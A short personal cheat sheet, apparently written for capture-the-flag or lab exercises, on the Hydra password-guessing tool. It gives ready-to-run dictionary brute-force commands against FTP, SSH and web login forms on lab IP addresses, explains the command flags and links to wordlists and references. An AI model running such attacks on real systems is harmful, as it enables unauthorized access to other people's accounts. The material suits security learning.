# Hydra

## Description

## Installation

## Usage

## Resources

`"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"`

hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.226.38 ftp

<https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef>

<https://attack.mitre.org/techniques/T1210/>

<https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/>

<https://en.kali.tools/?p=220>

`hydra -l <username> -P <full path to pass> 10.10.248.5 -t 4 ssh`

`-l = username`
`-P = password list`
`-t = number of threads`

Web form: `hydra -l <username> -P <wordlist> 10.10.248.5 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

SSH: `hydra -l <username> -P <full path to pass> 10.10.248.5 -t 4 ssh`

hydra -l molly -P rockyou.txt 10.10.248.5 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

SecLists <https://github.com/danielmiessler/SecLists>

"hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.214.108 ssh"

SECTION FUNCTION
hydra Runs the hydra tool
-t 16
Number of parallel connections per target
-l [user] Points to the user who's account you're trying to compromise
-P [path to dictionary] Points to the file containing the list of possible passwords
-vV
Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP] The IP address of the target machine
ssh / protocol Sets the protocol
